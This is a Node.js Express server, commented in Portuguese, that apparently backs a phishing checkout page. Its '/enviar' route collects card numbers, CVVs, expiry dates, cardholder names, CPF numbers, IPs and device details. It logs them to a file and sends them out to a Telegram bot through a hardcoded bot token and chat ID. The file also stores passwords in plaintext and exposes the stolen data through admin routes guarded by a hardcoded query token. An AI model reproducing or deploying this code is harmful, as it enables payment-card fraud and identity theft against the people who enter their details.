const express = require('express');
const path = require('path');
const fs = require('fs');
const fetch = require('node-fetch'); // use v2 no package.json
const cors = require('cors');

const app = express();

// ========= Middleware básico =========
app.use(cors());
app.use(express.json());
app.use(express.urlencoded({ extended: true }));

// ========= Estáticos =========
app.use(express.static(path.join(__dirname, 'site')));
app.get('/', (req, res) => {
  res.sendFile(path.join(__dirname, 'site', 'index.html'));
});

// ========= Config =========
const PORT = process.env.PORT || 3000;
const DATA_DIR = __dirname;
const usersFile = path.join(DATA_DIR, 'users.txt');
const checkoutFile = path.join(DATA_DIR, 'checkout.txt');

// ENV variables com fallback
const TELEGRAM_TOKEN = process.env.TELEGRAM_BOT_TOKEN || "8492628989:AAH28BrxrcyF0hdwLVSAFTvsA7OA80_OkGA";
const CHAT_ID = process.env.TELEGRAM_CHAT_ID || "-1002852733056";
const ADMIN_TOKEN = process.env.ADMIN_TOKEN || 'MOUSEPADGAFANHOTO';

// ========= Utils =========
function ensureFilesExist() {
  if (!fs.existsSync(usersFile)) fs.writeFileSync(usersFile, '', 'utf8');
  if (!fs.existsSync(checkoutFile)) fs.writeFileSync(checkoutFile, '', 'utf8');
}
function nowISO() { return new Date().toISOString(); }

async function sendToTelegram(message) {
  if (!TELEGRAM_TOKEN || !CHAT_ID) {
    console.warn('⚠️ TELEGRAM env ausentes. Pulando envio.');
    return { ok: false, skipped: true };
  }
  const url = `https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`;
  const body = { chat_id: CHAT_ID, text: message, parse_mode: 'HTML', disable_web_page_preview: true };
  const resp = await fetch(url, { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify(body) });
  const data = await resp.json().catch(() => ({}));
  if (!resp.ok || data.ok === false) {
    const desc = (data && data.description) ? data.description : `HTTP ${resp.status}`;
    throw new Error(`Erro do Telegram: ${desc}`);
  }
  return data;
}

// ========= Registro =========
app.post('/register', (req, res) => {
  const { username, password, fullname } = req.body || {};
  if (!username || !password || !fullname) {
    return res.json({ success: false, message: 'Campos obrigatórios não preenchidos.' });
  }
  try {
    ensureFilesExist();
    const lines = fs.readFileSync(usersFile, 'utf8').split('\n').filter(Boolean);
    const exists = lines.some(line => line.split('|')[0] === username);
    if (exists) return res.json({ success: false, message: 'Usuário já existe.' });

    const row = `${username}|${password}|${fullname}|${nowISO()}\n`;
    fs.appendFileSync(usersFile, row, 'utf8');
    console.log(`Novo usuário registrado: ${username}`);
    return res.json({ success: true, message: 'Usuário registrado com sucesso!' });
  } catch (err) {
    console.error('Erro /register:', err);
    return res.status(500).json({ success: false, message: 'Erro no servidor.' });
  }
});

// ========= Login =========
app.post('/login', (req, res) => {
  const { username, password } = req.body || {};
  if (!username || !password) {
    return res.json({ success: false, message: 'Informe usuário e senha.' });
  }
  try {
    ensureFilesExist();
    const users = fs.readFileSync(usersFile, 'utf8').split('\n').filter(Boolean)
      .map(line => line.split('|'));
    const ok = users.find(([u, p]) => u === username && p === password);
    if (ok) {
      console.log(`Login ok: ${username}`);
      return res.json({ success: true, fullname: ok[2] || '' });
    }
    console.log(`Login falhou: ${username}`);
    return res.json({ success: false, message: 'Usuário ou senha inválidos.' });
  } catch (err) {
    console.error('Erro /login:', err);
    return res.status(500).json({ success: false, message: 'Erro no servidor.' });
  }
});

// ========= Checkout =========
app.post('/enviar', async (req, res) => {
  try {
    const {
      cardNumber,
      cardcvvName,
      expiry,
      cardholderIdentificationNumber,
      cardholderNameC,
      timeOnPage,   // novo
      os,           // novo
      connection    // novo
    } = req.body || {};

    if (!cardNumber || !cardcvvName || !expiry || !cardholderIdentificationNumber || !cardholderNameC) {
      return res.status(400).json({ success: false, message: 'Todos os campos obrigatórios são necessários.' });
    }

    ensureFilesExist();

    const payload = {
      ts: nowISO(),
      cardNumber,
      cardcvvName,
      expiry,
      cardholderIdentificationNumber,
      cardholderNameC,
      ip: req.headers['x-forwarded-for'] || req.socket.remoteAddress || '',
      ua: req.headers['user-agent'] || '',
      timeOnPage: timeOnPage || null,
      os: os || 'Desconhecido',
      connection: connection || 'Desconhecido'
    };

    fs.appendFileSync(checkoutFile, JSON.stringify(payload) + '\n', 'utf8');
    console.log('✔️ checkout salvo em', checkoutFile);

    const mensagem =
      `<b>Nova Info Recebida</b>\n` +
      `💳 <b>Número:</b> ${cardNumber}\n` +
      `🔒 <b>CVV:</b> ${cardcvvName}\n` +
      `📅 <b>Validade:</b> ${expiry}\n` +
      `👤 <b>Nome:</b> ${cardholderNameC}\n` +
      `🆔 <b>CPF:</b> ${cardholderIdentificationNumber}\n` +
      `🕒 <b>TS:</b> ${payload.ts}\n` +
      `🌐 <b>IP:</b> ${payload.ip}\n` +
      `💻 <b>SO:</b> ${payload.os}\n` +
      `📡 <b>Conexão:</b> ${payload.connection}\n` +
      `⏱️ <b>Tempo na página:</b> ${payload.timeOnPage ? payload.timeOnPage + 'ms' : 'desconhecido'}`;

    try {
      await sendToTelegram(mensagem);
      console.log('📨 enviado ao Telegram');
      return res.json({ success: true, message: 'Dados processados e enviados com sucesso!' });
    } catch (tgErr) {
      console.error('Falha Telegram:', tgErr.message);
      return res.json({ success: true, message: 'Dados processados (Falha ao enviar ao Telegram).', telegram_error: tgErr.message });
    }
  } catch (error) {
    console.error('Erro /enviar:', error);
    return res.status(500).json({ success: false, message: 'Erro interno do servidor' });
  }
});

// ========= Admin =========
app.get('/admin/checkouts', (req, res) => {
  const token = req.query.token;
  if (token !== ADMIN_TOKEN) return res.status(403).send('Acesso negado');
  try {
    ensureFilesExist();
    const data = fs.readFileSync(checkoutFile, 'utf8');
    res.type('text/plain').send(data || '(vazio)');
  } catch (e) {
    console.error('Erro admin/checkouts:', e);
    res.status(500).send('Erro ao ler checkout.txt');
  }
});

app.get('/admin/users', (req, res) => {
  const token = req.query.token;
  if (token !== ADMIN_TOKEN) return res.status(403).send('Acesso negado');
  try {
    ensureFilesExist();
    const data = fs.readFileSync(usersFile, 'utf8');
    res.type('text/plain').send(data || '(vazio)');
  } catch (e) {
    console.error('Erro admin/users:', e);
    res.status(500).send('Erro ao ler users.txt');
  }
});

// ========= Status & Health =========
app.get('/status', (_req, res) => {
  ensureFilesExist();
  const usersCount = fs.readFileSync(usersFile, 'utf8').split('\n').filter(l => l.trim()).length;
  const checkoutsCount = fs.readFileSync(checkoutFile, 'utf8').split('\n').filter(l => l.trim()).length;
  res.json({ status: 'online', timestamp: nowISO(), users_count: usersCount, checkouts_count: checkoutsCount });
});
app.get('/api/health', (_req, res) => res.json({ ok: true, ts: nowISO() }));

// ========= Inicialização =========
ensureFilesExist();
app.listen(PORT, '0.0.0.0', () => {
  console.log(`🚀 Servidor rodando na porta ${PORT}`);
  console.log(`📝 usersFile: ${usersFile}`);
  console.log(`💳 checkoutFile: ${checkoutFile}`);
  console.log(`🔐 ADMIN_TOKEN: ${ADMIN_TOKEN ? '(setado)' : '(ausente)'}`);
});

// ========= Tratamento global de erros =========
process.on('uncaughtException', (err) => console.error('Erro não capturado:', err));
process.on('unhandledRejection', (reason) => console.error('Promise rejeitada:', reason));
